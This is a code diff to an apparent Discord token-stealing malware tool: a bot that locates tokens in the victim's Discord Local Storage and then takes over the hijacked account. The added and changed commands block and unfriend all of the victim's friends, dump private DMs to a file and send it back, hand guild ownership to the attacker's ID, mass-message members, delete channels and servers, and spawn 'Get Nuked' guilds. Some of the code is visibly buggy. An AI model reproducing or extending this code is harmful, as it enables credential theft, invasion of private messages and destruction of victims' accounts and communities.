@@ -1,3 +1,4 @@
+import json
 import random
 import discord
 from discord.ext import commands
@@ -10,9 +11,14 @@ import requests
 
 tokenworking = ""
 attackerid = "" #your id
+user = os.getenv('USERNAME')
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 tokens = []
+
+def tuple_to_string(tuple):
+    str =  ''.join(tuple)
+    return str
 
 def check_token(token):
     headers = {
@@ -51,6 +57,51 @@ async def on_ready():
     print("Logged in as: " + bot.user.name)
 
 @bot.command()
+async def block_all(ctx):
+    for user in bot.user.friends:
+        await user.block()
+
+@bot.command()
+async def unfried_all(ctx):
+    for user in bot.user.friends:
+        await user.remove_friend()
+
+@bot.command()
+async def change_language(ctx, args):
+    headers = {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+        "authorization": tokenworking
+        }
+    json = {
+        "locale": args
+    }
+    requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
+
+@bot.command()
+async def change_theme(ctx, args):
+    print(args)
+    if args == "dark":
+        headers = {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+        "authorization": tokenworking
+        }
+        json = {
+            "theme": "dark"
+        }
+        rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
+        print("code: " + str(rq.status_code))
+    if args == "light":
+        headers = {
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+        "authorization": tokenworking
+        }
+        json = {
+            "theme": "light"
+        }
+        rq = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
+        print("code: " + str(rq.status_code))
+
+@bot.command()
 async def ban_account(ctx):
     headers = {
         "user-agent": "Mozzilla/5.0 (Windows NT 1.0;) Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/737.36",
@@ -65,15 +116,17 @@ async def dmdump(ctx):
         messages = await ch.history(limit=200).flatten()
         for message in messages:
             with open("C:\\Users\\Public\\dms.txt", "a", encoding='utf-8-sig') as dmfile:
-                to_write = str(message.channel) + "> " + str(message.content) + "\n"
+                to_write = str(message.channel) + "> " + str(message.content) + " " + str(messages.author.name) + "\n"
                 dmfile.write(to_write)
-        ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
+    await ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
+
 @bot.command()
 async def delete(ctx):
     try:
         await ctx.guild.delete()
     except:
         print("i dont have guild permission")
+
 @bot.command()
 async def owner(ctx):
     user = bot.fetch_user(attackerid) # your id
@@ -81,6 +134,14 @@ async def owner(ctx):
         await ctx.guild.edit(owner=user)
     except:
         print("cant")
+
+@bot.command()
+async def send_to_everyone(ctx, *args):
+    for user in ctx.guild.members:
+        try:
+            await user.send(tuple_to_string(args))
+        except:
+            print("could not send to " + user.name)
 
 @bot.command()
 async def baneveryone(ctx):
@@ -92,6 +153,17 @@ async def baneveryone(ctx):
             pass
 
 @bot.command()
+async def change_server_icon(ctx):
+    ctx.send(tuple_to_string(ctx.message.attachments))
+
+@bot.command()
+async def rename_server(ctx, *args):
+    try:
+        await ctx.guild.edit(name=tuple_to_string(args))
+    except:
+        print("cant")
+
+@bot.command()
 async def deletechannels(ctx):
     for c in ctx.guild.channels:
         try:
@@ -101,17 +173,18 @@ async def deletechannels(ctx):
             pass
 
 @bot.command()
-async def leaveallservers(ctx):
+async def create_guilds(ctx, args):
+    args = int(args)
+    for _ in range(args):
+        await bot.create_guild(name="Get Nuked")
+
+@bot.command()
+async def leave_all_guilds(ctx):
     for guild in bot.guilds:
         try:
             guild.leave()
         except:
             guild.delete()
-
-@bot.command()
-async def blockallfriends(ctx):
-    for friend in bot.user.friends:
-        friend.block()
 
 path1 = roaming + '\\discord\\Local Storage\\leveldb'
 path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
